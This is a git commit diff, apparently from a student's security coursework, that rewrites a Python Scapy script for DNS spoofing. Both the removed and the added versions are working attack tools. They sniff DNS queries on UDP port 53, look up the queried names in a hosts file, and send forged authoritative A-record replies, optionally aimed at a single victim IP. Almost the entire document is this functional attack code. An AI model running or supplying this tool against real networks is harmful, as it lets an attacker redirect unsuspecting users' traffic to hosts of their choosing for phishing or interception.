6e5181767f086265f46b5113f311e351222b1af6
Victor Iliescu <v.iliescu@student.tue.nl>
2026-01-14 17:13:33 +0100

    Dns poisoning close to done - Need a bit of testing

--- dns_poison.py
+++ dns_poison.py
@@ -1,70 +1,92 @@
-#!/usr/bin/python3
-
+import argparse
 import sys
-import getopt
-import scapy.all as scapy
+from scapy.all import sniff, send, IP, UDP, DNS, DNSQR, DNSRR, conf
 
-dev = "enp3s0f1"
-filter = "udp port 53"
-file = None
-dns_map = {}
 
-def handle_packet( packet):
-    ip = packet.getlayer (scapy.IP)
-    udp = packet.getlayer (scapy.UDP)
-    dns = packet.getlayer (scapy.DNS)
+def load_hosts(path):
+    hosts = {}
+    with open(path, "r", encoding="utf-8") as handle:
+        for raw_line in handle:
+            line = raw_line.strip()
+            if not line or line.startswith("#"):
+                continue
+            parts = line.split()
+            if len(parts) < 2:
+                continue
+            ip = parts[0]
+            domain = parts[1].rstrip(".").lower() + "."
+            hosts[domain] = ip
+    return hosts
 
-    # standard (a record ) dns query
-    if dns.qr == 0 and dns.opcode == 0:
-        queried_host = dns.qd.qname[:-1].decode()
-        resolved_ip = None
 
-        if dns_map.get(queried_host):
-            resolved_ip = dns_map.get(queried_host)
-        elif dns_map.get('*'):
-            resolved_ip = dns_map.get('*')
+def should_spoof(pkt, target_ip):
+    if not pkt.haslayer(IP):
+        return False
+    if target_ip and pkt[IP].src != target_ip:
+        return False
+    return True
 
-        if resolved_ip:
-            dns_answer = scapy.DNSRR(rrname=queried_host + ".", ttl=330, type="A", rclass="IN", rdata=resolved_ip)
 
-            dns_reply = scapy.IP(src=ip.dst, dst=ip.src) / \
-                scapy.UDP(sport=udp.dport, dport=udp.sport) / \
-                scapy.DNS(id=dns.id, qr=1, aa=0, rcode=0, qd=dns.qd, an=dns_answer)
+def make_response(pkt, spoof_ip):
+    qname = pkt[DNSQR].qname
+    return (
+        IP(dst=pkt[IP].src, src=pkt[IP].dst)
+        / UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
+        / DNS(
+            id=pkt[DNS].id,
+            qr=1,
+            aa=1,
+            qd=pkt[DNS].qd,
+            an=DNSRR(rrname=qname, ttl=60, rdata=spoof_ip),
+        )
+    )
 
-            print("Send %s has %s to %s" % (queried_host, resolved_ip, ip.src))
-            
-            scapy.send(dns_reply, iface=dev)  
 
-def usage():
-    print(sys.argv[0] + " -f <hosts -file > -i <dev >")
-    sys.exit(1)
+def handle_packet(pkt, hosts, target_ip):
+    if not pkt.haslayer(DNSQR) or not pkt.haslayer(UDP):
+        return
+    if pkt[DNS].qr != 0:
+        return
+    # Only handle DNS Type A (IPv4) queries (qtype=1)
+    if pkt[DNSQR].qtype != 1:
+        return
+    if not should_spoof(pkt, target_ip):
+        return
+    qname = pkt[DNSQR].qname.decode(errors="ignore").lower()
+    if not qname.endswith("."):
+        qname += "."
+    spoof_ip = hosts.get(qname)
+    if not spoof_ip:
+        return
+    response = make_response(pkt, spoof_ip)
+    print(f"[*] Spoofed {qname} -> {spoof_ip}")
+    send(response, verbose=0)
 
-def parse_host_file( file):
-    for line in open(file):
-        line = line.rstrip('\n')
 
-        if line:
-            (ip, host) = line.split()
-            dns_map[host] = ip
+def run_dns_spoof(iface, target_ip, hosts_file):
+    hosts = load_hosts(hosts_file)
+    if not hosts:
+        print("No host mappings loaded.")
+        return
 
-try:
-    cmd_opts = "f:i:"
-    opts , args = getopt.getopt(sys.argv [1:], cmd_opts)
-except getopt.GetoptError:
-    usage()
+    if iface:
+        conf.iface = iface
 
-for opt in opts:
-    if opt[0] == "-i":
-        dev = opt[1]
-    elif opt[0] == "-f":
-        file = opt[1]
-    else:
-        usage()
+    print(f"Listening on {conf.iface} with {len(hosts)} host entries")
+    try:
+        sniff(filter="udp port 53", store=0, prn=lambda p: handle_packet(p, hosts, target_ip))
+    except KeyboardInterrupt:
+        print("Stopping.")
 
-if file:
-    parse_host_file( file)
-else:
-    usage()
 
-print("Spoofing DNS requests on %s" % (dev))
-scapy.sniff(iface=dev , filter=filter , prn= handle_packet)
+def main():
+    parser = argparse.ArgumentParser(description="DNS spoofing with Scapy")
+    parser.add_argument("-i", "--iface", help="Interface to listen on")
+    parser.add_argument("-t", "--target-ip", help="Only spoof this client IP")
+    parser.add_argument("-f", "--hosts-file", default="dns-file.txt", help="Host mapping file")
+    args = parser.parse_args()
+    run_dns_spoof(args.iface, args.target_ip, args.hosts_file)
+
+
+if __name__ == "__main__":
+    sys.exit(main())
